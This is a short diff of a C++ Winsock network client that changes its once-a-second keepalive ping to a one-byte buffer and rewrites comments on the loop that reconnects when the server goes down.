@@ -11,6 +11,7 @@
 using namespace std;
 
 //-----Prototypes and global vars
+const char pingbuffer[1] = {'*'}; // Ping server command
 char sendbuffer[200];
 void ReverseIP(char* pIP);
 WSADATA wsaData;
@@ -78,11 +79,13 @@ printf("Fail connect..");
 //Ping loop .. very confusing at first glance , we always want to ping the server every second , so our commands are sent inside the ping loop!
 for(;;){
       do{
-       sprintf(sendbuffer,"Ping");
-      Sleep(1000);
+
+      Sleep(1000); // NO SPAM!
       }
-      while(send(sock,sendbuffer,sizeof(sendbuffer),0) != SOCKET_ERROR); //we do first because we want to make sure we have the buffer ready , then we while to check if the server is up while also informing the server we are alive
- break; //break out of do loop and go back to connect loop if server downs
+      while(send(sock,pingbuffer,sizeof(pingbuffer),0) != SOCKET_ERROR);  // Send a ping buffer
+
+      //we do first because we want to make sure we have the buffer ready , then we while to check if the server is up while also informing the server we are alive
+ break; // if we get here , send = socket_error , meaning server down. break out of do loop and go back to connect loop if server downs
 }
 
 //If we get here it means the server down, attempt to reconnect.
